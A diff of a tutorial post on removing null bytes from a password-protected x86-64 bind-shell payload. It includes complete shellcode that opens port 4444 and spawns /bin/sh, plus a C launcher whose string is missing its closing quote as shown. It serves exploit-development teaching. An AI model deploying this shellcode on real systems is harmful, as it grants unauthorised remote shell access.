@@ -365,8 +365,6 @@ syscall ;execve syscall instruction
 
 Ok, that last part was quite a confusing bit, but after a few times you should get it.
 
-The complete Assembly code can be found [here](https://github.com/J33R4FF3/Pass_Bind_Shell) as Pass_Bind_Shell.nasm. 
-
 And that's it, we can now compile and run it and we should be presented with the same capabilities of our C program.
 
 ```bash
@@ -507,9 +505,67 @@ After we substitute all the registers, we are left with the following:
 ┌──(kali㉿kali)-[~/pass_bind_nasm]
 └─$ objdump -d pass.o | grep 00
 0000000000000000 <_start>:
-   8:   ba 00 00 00 00          mov    $0x0,%edx
-  21:   66 c7 44 24 f8 02 00    movw   $0x2,-0x8(%rsp)
-  62:   be 00 00 00 00          mov    $0x0,%esi
+   8:   b2 00                   mov    $0x0,%dl
+  1e:   66 c7 44 24 f8 02 00    movw   $0x2,-0x8(%rsp)
+  5f:   40 b6 00                mov    $0x0,%sil
 00000000000000b8 <exit>:
 ```
+
+As you can see, this technique did not work for two of the instructions and that is because we are actually specifying the null byte by trying to insert a 0 into the registers. So we need to look for opportunities to pass a 0 into the register without explicitly assigning it. Luckily we have other registers that are not used and are still 0. Let's see what we are left with if we use this technique:
+
+```nasm
+mov dl, bl ;bl is 8 bit part of rbx that we have not used so we are essentially moving in a zero to rdx
+mov rsi, rbx ;same technique but using the full 64-bit register
+```
+
+```bash
+┌──(kali㉿kali)-[~/pass_bind_nasm]
+└─$ objdump -d pass.o | grep 00
+0000000000000000 <_start>:
+  1e:   66 c7 44 24 f8 02 00    movw   $0x2,-0x8(%rsp)
+00000000000000b3 <exit>:
+```
+
+Ok, we are almost there. From the above instruction, you can see that we are trying to move 1 byte (0x2) using the movw (move word) instruction. Word is by default 2 bytes in size. So all we need to do is change 'word' to 'byte'.
+
+```nasm
+mov word [rsp-8], 0x2 --> mov byte [rsp-8], 0x2
+```
+```bash
+┌──(kali㉿kali)-[~/pass_bind_nasm]
+└─$ objdump -d pass.o | grep 00                          
+0000000000000000 <_start>:
+00000000000000b1 <exit>:
+```
+
+There we go, we rid our Assembly code of all null bytes. Let's see if it will execute in our C wrapper now:
+
+```c
+
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\xb0\x29\x40\xb7\x02\x40\xb6\x01\x88\xda\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\x89\x44\x24\xfc\x66\xc7\x44\x24\xfa\x11\x5c\xc6\x44\x24\xf8\x02\x48\x83\xec\x08\xb0\x31\x48\x89\xe6\xb2\x10\x0f\x05\x48\x31\xf6\xb0\x32\x40\xb6\x02\x0f\x05\xb0\x2b\x48\x83\xec\x10\x48\x89\xe6\xc6\x44\x24\xff\x10\x48\x83\xec\x01\x48\x89\xe2\x0f\x05\x49\x89\xc1\xb0\x03\x0f\x05\xb0\x21\x4c\x89\xcf\x48\x89\xde\x0f\x05\xb0\x21\x40\xb6\x01\x0f\x05\xb0\x21\x40\xb6\x02\x0f\x05\x48\x31\xc0\x41\x52\x48\x89\xe6\x48\x31\xd2\xb2\x08\x0f\x05\x48\x31\xc0\x48\xb8\x38\x62\x79\x74\x65\x73\x73\x73\x48\x89\xf7\x48\xaf\x75\x1e\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\x3c\x0f\x05;
+
+int main()
+{
+
+        printf("Shellcode Length:  %d\n", (int)strlen(code));
+
+        int (*ret)() = (int(*)())code;
+
+        ret();
+
+}
+```
+
+```bash
+osboxes@osboxes:~/Pass_Bind_Shell$ ./shellcode 
+Shellcode Length:  184
+```
+
+That looks a lot better. We have now effectively optimized our Assembly code and it is ready to be used as shellcode.
+
+The complete Assembly code and shellcode can be found [here](https://github.com/J33R4FF3/Pass_Bind_Shell) as Pass_Bind_Shell.nasm and Shellcode. 
 
